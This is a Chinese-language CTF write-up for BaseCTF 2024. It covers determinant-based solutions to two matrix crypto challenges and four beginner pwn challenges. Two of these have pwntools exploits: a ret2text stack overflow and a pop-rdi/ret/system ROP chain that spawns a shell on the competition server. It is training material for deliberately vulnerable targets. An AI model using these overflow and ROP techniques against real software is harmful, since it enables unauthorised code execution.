---
title: '[BaseCTF2024]sudopacman个人Writeup(包含部分Crypto与Pwn)'
date: 2024-08-22
permalink: /posts/2024/08/basectf_crypto/
excerpt: '以下为BaseCTF2024中的个人出题writeup与一些学习笔记...'
tags:
  - ctf
  - crypto
  - pwn
---

# Week1(Crypto)

## ez_math

该题主要考察对代数中行列式的掌握.

### 题目

#### task

```python
import numpy as np
from Crypto.Util.number import *

a, b, c, d = [getPrime(128) for _ in range(4)]
point1 = a * d
point2 = b * c
matrix2 = [[0, a, b], [0, c, d]]

flag = b"vyctf{test_flag}"
flag = bytes_to_long(flag)


def randomArray():
    upper = [[1, 0, 0], [0, 1, 0], [0, 0, 1]]
    low = [[1, 0, 0], [0, 1, 0], [0, 0, 1]]
    for i in range(3):
        for j in range(i+1, 3):
            upper[i][j] = getPrime(128)
            low[j][i] = getPrime(128)
    result = np.array(upper) @ np.array(low)
    return result

A = np.array([[flag, 0, 0]] + matrix2)
B = randomArray()
MAT = A @ B

print(point1)
print(point2)
print(MAT)
'''
81311989977387451668874941430338257071014446363574678418784365496344582666849
33057017600009729208384496757075537085301614200117584995338336257846046305771
[[27946539127558634550260328842774768382284228855493793321977765592483052720891089914327074421994212991548713007103916346235907210700468874119
  12746215308222919663581249923954804223696039526060889660432132715658881068248395657778457378460433022923383943453512377081482379817812509158
  38950026103717954346582831819694411312667649197656828555477064282014137949941775913023870290529406517]
 [15704422103650016650429304950255206186334814115692743710199465440122888440574451079743335027448732409013393593827085
  21917323070132694922086886658852071097488099875542617384997994075892695260734651679923576537198873049431041157400883
  66975198916854677961309171374284660865377281114011862647946805687039892721262]
 [9298167017438631472676758380254209408658263280953282683670864101771109464884120301525964984820849011313871503174357
  12976659003191821238978464224740222181158574655214270138537349794385602562218218519987157679149406447951468669396555
  39654218502593047619465990745717713063319452352531140443027446816425464289936]]
'''
```

#### 分析

我们已知存在一个矩阵A:

$$
A=\begin{bmatrix}
flag & 0 & 0 \\
0 & a & b \\
0 & c & d
\end{bmatrix}
$$

其中 $a, b, c, d$ 为随机数, 我们明显可以将其看作一个分块矩阵:

$$
A=\begin{bmatrix}
flag & 0 \\
0 & A_{abcd}
\end{bmatrix}, \\
A_{abcd}=\begin{bmatrix}
a & b \\
c & d
\end{bmatrix}
$$

即对A求行列式有:

$$
|A|=|flag|*|A_{abcd}|
$$

对于二阶矩阵我们可以计算:

$$
|A_{abcd}|=a*d-b*c
$$

其中已给出`point1`, `point2`, 我们可以计算出矩阵$B$的行列式, 即只需要知道矩阵的行列式即可求出flag, 对于矩阵B有:

$$
B = B_{upper} * B_{low}
$$

其中 B_{upper} 为主对角线为1的上三角矩阵, B_{low} 为主对角线为1的下三角矩阵, 稍微了解高等代数可以得知:
$$
|B|=1
$$

又有:

$$
MAT = A * B
$$

故有:

$$
|MAT| = |A|
$$

我们可以通过以下方式计算flag:

$$
flag = |flag| = \frac{|MAT|}{|A_{abcd}|}
$$

### EXP

```python
point1 = 81311989977387451668874941430338257071014446363574678418784365496344582666849
point2 = 33057017600009729208384496757075537085301614200117584995338336257846046305771
MAT = [
        [27946539127558634550260328842774768382284228855493793321977765592483052720891089914327074421994212991548713007103916346235907210700468874119,
         12746215308222919663581249923954804223696039526060889660432132715658881068248395657778457378460433022923383943453512377081482379817812509158,
         38950026103717954346582831819694411312667649197656828555477064282014137949941775913023870290529406517],
        [15704422103650016650429304950255206186334814115692743710199465440122888440574451079743335027448732409013393593827085,
         21917323070132694922086886658852071097488099875542617384997994075892695260734651679923576537198873049431041157400883,
         66975198916854677961309171374284660865377281114011862647946805687039892721262],
        [9298167017438631472676758380254209408658263280953282683670864101771109464884120301525964984820849011313871503174357,
         12976659003191821238978464224740222181158574655214270138537349794385602562218218519987157679149406447951468669396555,
         39654218502593047619465990745717713063319452352531140443027446816425464289936
         ]
    ]
from sage.all import *
from Crypto.Util.number import *
print(long_to_bytes(det(matrix(MAT)) // (point1 - point2)))
# b"vyctf{You_know_algebra!!!}
```

## mid_math

### 题目

#### task

```python
import numpy as np
from Crypto.Util.number import *

a, b, c, d = [getPrime(128) for _ in range(4)]
point1 = a * d
point2 = b * c
matrix2 = [[0, a, b], [0, c, d]]

flag = b"flag{test_flag}"
flag = bytes_to_long(flag)

def randomArray():
    upper = [[1, 0, 0], [0, 1, 0], [0, 0, 1]]
    low = [[1, 0, 0], [0, 1, 0], [0, 0, 1]]
    for i in range(3):
        for j in range(i+1, 3):
            upper[i][j] = getPrime(128)
            low[j][i] = getPrime(128)

    result = np.array(upper) @ np.array(low)
    return result

A = np.array([[flag, 0, 0]] + matrix2)
B = randomArray()
C = randomArray()
MAT =  C @ A @ B


print(point1)
print(point2)
print(MAT)

'''
65540596822333029826884315503808996273733737079814345540607878287618419734231
45151244176940366132774311848077675849486332018843894072137609985463616792271
[[9259505595451159514948336330303511539525155092949382077995385373332083424570340733825203563332256599256361679775371565817159463557158551820090084800254999338417057682355404780422980119717238594927467956675771042145306399815569005775907169857728757334979422594358
  3700462282298785820527479428312072678870010244861115107206951164684911761755437333209293039456840068340334559453608012512177623936248784897843503284633804083281388001236742261832974291349480314135560368365574114042082002559069958228523318326290833422846224288247
  20791012146351643571145217310876690226642338279942557085580439219377325884045305279931904540467264182713135410067252835618936836675270813727053937054168296298149405902638242278868020381541490973458957704137657413376043351193]
 [3802535350808074374431476757195874789213113083310705049856269457737583463559458126494122484246497049005001474007088865512110432486291568737501434666990689483191924384489484665070592656641925905986397402822195880143437724155134584374613878027218950975919679551229
  1519642544380087919293814751485424198320747098741960781639133554268321708273309194651985562222274023623071346914239982055028526526058064787882720065775210796950963778381575914964024929110539407721461321785325399699126116201001806816030960662346173275101476487421
  8538097185709421082644083672229287227818939415260987123718318427750267353075860559170390896769087600458156859498331152566368881938040799840806164389020986990994328370205184734637870147251004626759120887684269603636183629300]
 [17987668490992083132878642797176089621188858356259455169173987325310681186627844776077058221612169421636403546746899152917309634315569997105261046388995579843528014810244648968375990949478033964619008761814039733347955609163
  7188579142941521685422767412932555782658469950638690886255638896617687421517941457682493542615460990114218059246938237257830976937359020731335958068934235967457123039874441635435388736524907036941379695243043923900290273902
  40388963560266769813551191613694768219344365780650048155838802242681775019274045964917142477325170274191702615504062392461666558731638338001971723737440974198823443420018559746335727687]]
'''
```

#### 分析

与ez_math相同, 只不过再加了以组C矩阵进行混淆, 无法再使用gcd或直接分解质数求解.

### EXP

```python
point1 = 65540596822333029826884315503808996273733737079814345540607878287618419734231
point2 = 45151244176940366132774311848077675849486332018843894072137609985463616792271

MAT = [[9259505595451159514948336330303511539525155092949382077995385373332083424570340733825203563332256599256361679775371565817159463557158551820090084800254999338417057682355404780422980119717238594927467956675771042145306399815569005775907169857728757334979422594358,
  3700462282298785820527479428312072678870010244861115107206951164684911761755437333209293039456840068340334559453608012512177623936248784897843503284633804083281388001236742261832974291349480314135560368365574114042082002559069958228523318326290833422846224288247,
  20791012146351643571145217310876690226642338279942557085580439219377325884045305279931904540467264182713135410067252835618936836675270813727053937054168296298149405902638242278868020381541490973458957704137657413376043351193],
 [3802535350808074374431476757195874789213113083310705049856269457737583463559458126494122484246497049005001474007088865512110432486291568737501434666990689483191924384489484665070592656641925905986397402822195880143437724155134584374613878027218950975919679551229,
  1519642544380087919293814751485424198320747098741960781639133554268321708273309194651985562222274023623071346914239982055028526526058064787882720065775210796950963778381575914964024929110539407721461321785325399699126116201001806816030960662346173275101476487421,
  8538097185709421082644083672229287227818939415260987123718318427750267353075860559170390896769087600458156859498331152566368881938040799840806164389020986990994328370205184734637870147251004626759120887684269603636183629300],
 [17987668490992083132878642797176089621188858356259455169173987325310681186627844776077058221612169421636403546746899152917309634315569997105261046388995579843528014810244648968375990949478033964619008761814039733347955609163,
  7188579142941521685422767412932555782658469950638690886255638896617687421517941457682493542615460990114218059246938237257830976937359020731335958068934235967457123039874441635435388736524907036941379695243043923900290273902,
  40388963560266769813551191613694768219344365780650048155838802242681775019274045964917142477325170274191702615504062392461666558731638338001971723737440974198823443420018559746335727687]]
from sage.all import *
from Crypto.Util.number import *
print(long_to_bytes(det(matrix(MAT)) // (point1 - point2)))

# b'BaseCTF{E439646E-1768-18B3-DC4B-483C40C5340C}'
```

# Week1(Pwn)

## 签个到吧

### 分析

题目主要考察新生对pwn题连接的应用, 这里我们推荐使用`VY-netcat`, 同样直接下载`Gnu-netcat`或`openbsd-netcat`使用方法相同.

打开容器创建实例, 例如`challenge.basectf.fun:29866`.

netcat的地址如下:
- gitee: https://gitee.com/cryingn/vy-netcat
- github: https://github.com/cryingn/vy-netcat

找到`发行版`/`Releases`, 直接下载最新版本, 当前已支持linux与windows, 当然也可以考虑自行下载源码进行编译.

使用方式, 在下载位置输入:

```bash
./nc challenge.basectf.fun 29866
```

连接成功后, 输入以下代码拿到flag.

```bash
cat flag
```

## echo

### 题目描述

binsh目录下只有echo？ echo flag??

### 分析

使用方式同上, 本题在docker环境设置时去掉了其他指令, 只留下了`bin/echo`, `bin/sh`.

故可以考虑使用`echo`直接拿到flag:

```bash
echo *          # 查看文件
echo "$(<flag)" # 查看flag文件内容
```

拿到flag.

## Ret2text

本题是简单的栈溢出类题目, 主要考察pwntools与反编译的理解.

### 反编译与分析

本题使用的反编译工具为[retdec](https://gitee.com/retdec/retdec), 是一款终端下的反编译工具, 当前**avast**已停止维护, 有**VYCMa**继续接手维护.

在终端反编译task文件:

```c
[root_cn@archlinux pwn]$ retdec task
...(反编译日志)
[root_cn@archlinux pwn]$ cat task.c | head -n 17 | tail -n +12
int main(int argc, char ** argv) {
    // 0x401176
    int64_t buf; // bp-40, 0x401176
    read(0, &buf, 256);
    return 0;
}
```

从task.c可以发现`buf`到溢出位置为40, `read()`函数的读取数却有256, 明显的栈溢出.

```nasm
[root_cn@archlinux pwn]$ cat task.dsm | head -n 143 | tail -n +137
0x4011bb:   48 8d 05 58 0e 00 00        lea rax, [rip + 0xe58]
0x4011c2:   48 89 c7                    mov rdi, rax
0x4011c5:   b8 00 00 00 00              mov eax, 0
0x4011ca:   e8 a1 fe ff ff              call 0x401070 <system>
0x4011cf:   90                          nop
0x4011d0:   5d                          pop rbp
0x4011d1:   c3                          ret
```

找到很明显的后门, 故只需要溢出后让地址指向后门地址, 可以拿到flag, 开始构造EXP.

### EXP

```python
from pwn import *

true_log = "\033[32m[True]\033[0m "
false_log = "\033[31m[False]\033[0m "
warn_log = "\033[33m[Warn]\033[0m "
choose_log = "\033[34m[Choose]\033[0m "
choose_true = {'yes','y','Y'}

the_io:str

def io(bin_file, url_port=""):
    global the_io, the_elf
    if url_port == "":
        if ".py" in bin_file:
            import subprocess
            args = [1,2]
            the_io = python_connect()
            subprocess.call(['python', bin_file] + args)
        else:
            the_io = process(bin_file)
            the_elf = ELF(bin_file)
    else:
        url, port = url_port.split(":")
        the_io = remote(url, port)
        try:
            the_elf = ELF(bin_file)
        except:
            print(warn_log + "无法获取ELF.")
    return the_io

pwn     = lambda                    : gdb.attach(the_io)
r       = lambda                    : the_io.recv()
rl      = lambda                    : the_io.recvline()
ru      = lambda load               : the_io.recvuntil(load)
ra      = lambda                    : the_io.recvall()
s       = lambda data               : the_io.send(data+b"\n")
sa      = lambda load, data         : the_io.sendafter(load, data+b"\n")
shell   = lambda                    : the_io.interactive()

plt     = lambda function           : the_elf.plt[function]

log     = lambda level, os="linux", arch="amd64": context(os='linux',arch='amd64', log_level="critical") if level else context(os='linux',arch='amd64', log_level="debug")

io("./task", "challenge.basectf.fun:49666")
log(True)
payload = b'a' * 40 + p64(0x4011bb)
s(payload)
shell()
```

## 我把她丢了

### 反编译与分析

```c
[root_cn@archlinux pwn]$ cat task.c | head -n 44 | tail -n +39
int64_t vuln(void) {
    // 0x401217
    puts("I lost her, what should I do? Help me find her.");
    int64_t buf; // bp-120, 0x401217
    return read(0, &buf, 336);
}
```

同样在120位溢出, 但是可写入336位, 可以尽情制造.

```nasm
[root_cn@archlinux pwn]$ cat task.dsm | head -n 159 | tail -n +150
; function: shell at 0x4011fd -- 0x401217
0x4011fd:   f3 0f 1e fa                 endbr64
0x401201:   55                          push rbp
0x401202:   48 89 e5                    mov rbp, rsp
0x401205:   48 8d 05 04 0e 00 00        lea rax, [rip + 0xe04]
0x40120c:   48 89 c7                    mov rdi, rax
0x40120f:   e8 6c fe ff ff              call 0x401080 <system>
0x401214:   90                          nop
0x401215:   5d                          pop rbp
0x401216:   c3                          ret
```

虽然有system, 但是找不到/bin/sh, 拿到shell需要几个条件:

> rdi指向 `/bin/sh`
>
> rsi = 0
>
> rdi = 0
>
> rax = 0x3b
> 
> syscall

我们可以人工去进行构造, 找到几个关键部分: .text的`/bin/sh`, 删除rdi的指令, 构造以下payload:

```python
pop_rdi = p64(0x401196) #函数位置
binsh = p64(0x402008)   #.text 上的'/bin/sh'位置
sh = p64(0x401084)      #指向到<system>本身.

payload = b"a" * 120 + pop_rdi + binsh + sh
```

然后翻车了, 根本拿不到shell, 以下是原理(我是穷举出来的):

> 我们先用pop rdi ret把bin/sh字符串地址放在rdi然后在调用system函数即可.

缺个返还, 这下可以构造正确的EXP了.

### EXP

```python
from pwn import *

true_log = "\033[32m[True]\033[0m "
false_log = "\033[31m[False]\033[0m "
warn_log = "\033[33m[Warn]\033[0m "
choose_log = "\033[34m[Choose]\033[0m "
choose_true = {'yes','y','Y'}

the_io:str
context(os='linux',arch='amd64', log_level="debug")

def io(bin_file, url_port=""):
    global the_io, the_elf
    if url_port == "":
        if ".py" in bin_file:
            import subprocess
            args = [1,2]
            the_io = python_connect()
            subprocess.call(['python', bin_file] + args)
        else:
            the_io = process(bin_file)
            the_elf = ELF(bin_file)
    else:
        url, port = url_port.split(":")
        the_io = remote(url, port)
        try:
            the_elf = ELF(bin_file)
        except:
            print(warn_log + "无法获取ELF.")
    return the_io

pwn     = lambda                    : gdb.attach(the_io)
r       = lambda                    : the_io.recv()
rl      = lambda                    : the_io.recvline()
ru      = lambda load               : the_io.recvuntil(load)
ra      = lambda                    : the_io.recvall()
s       = lambda data               : the_io.send(data+b"\n")
sa      = lambda load, data         : the_io.sendafter(load, data+b"\n")
shell   = lambda                    : the_io.interactive()

plt     = lambda function           : the_elf.plt[function]

log     = lambda level, os="linux", arch="amd64": context(os='linux',arch='amd64', log_level="critical") if level else context(os='linux',arch='amd64', log_level="debug")

io("task", "challenge.basectf.fun:49666")

log(True)
#pwn()

pop_rdi = p64(0x401196) #函数位置
binsh = p64(0x402008)   #.text 上的'/bin/sh'位置
ret = p64(0x401197)     # ret指令, 和哪个函数无关
sh = p64(0x401084)      #指向到<system>本身.

payload = b"a" * 120 + pop_rdi + binsh + ret + sh

sa(b"I lost her, what should I do? Help me find her.", payload)

shell()
```
